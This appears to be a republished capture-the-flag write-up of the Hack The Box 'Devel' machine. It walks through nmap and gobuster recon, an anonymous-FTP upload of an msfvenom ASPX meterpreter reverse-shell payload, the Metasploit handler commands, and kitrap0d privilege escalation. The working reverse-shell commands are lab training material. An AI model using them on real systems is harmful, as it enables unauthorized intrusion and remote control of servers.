# :game_die: HTB | Devel

> **Original Source:** [HTB | Devel](https://infosecwriteups.com/htb-devel-ab0b7cc4e159)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

This is a Windows box. You can find it [here](https://app.hackthebox.com/machines/Devel).

### Skill Learned


## NMAP


IP: 10.10.10.5


```
nmap -sC -sV 10.10.10.5 -Pn -T5
```


*nmap*

## Port 21


anonymous login is allowed

*ftp 10.10.10.5*


Found files

*ftp files*


Nothing interesting was found here

## Port 80


*port 80*


Let’s do gobuster


## Get anuragtaparia’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


we found `[http://10.10.10.5/aspnet_client/system_web/](http://10.10.10.5/aspnet_client/system_web/)`


*gobuster*

## Foothold & Priv Esc


### FTP


try putting test.txt

*ftp/test.txt*


Since there is asp, we make a payload for reverse shell


```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=1234 -f aspx > devel.aspx
```


*msfvenom*


and put in the server via FTP

*put devel.aspx*


```
open msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 1234
set ExitOnSession false
exploit -j
```


load the page` http://10.10.10.5/devel.aspx` and boom you have a session on our nc


*running payload*


and run `use post/multi/recon/local_exploit_suggester`


*exploit suggester*


on trying `exploit/windows/local/ms10_015_kitrap0d` I got the shell


*shell*


Fund user.txt

*user.txt*


Found root.txt

*root.txt*

---

*Originally published on [Medium](https://infosecwriteups.com/htb-devel-ab0b7cc4e159). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
